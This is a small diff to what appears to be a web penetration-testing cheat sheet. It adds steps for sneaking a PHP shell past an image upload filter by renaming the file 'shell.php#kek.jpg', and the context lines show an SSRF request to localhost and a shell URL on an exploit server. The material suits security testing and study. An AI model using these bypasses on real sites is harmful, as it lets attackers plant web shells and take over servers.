@@ -3534,6 +3534,8 @@ csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
 ```
 https://exploit-server.com/shell.php#kek.jpg
 ```
+3. Make sure to check that request in HTTP history tab to see if the app has encoded # in a certain way
+4. You can try to intercept the image upload request and then change the filename to shell.php#kek.jpg 
   
 ### XSS SVG Upload  
 
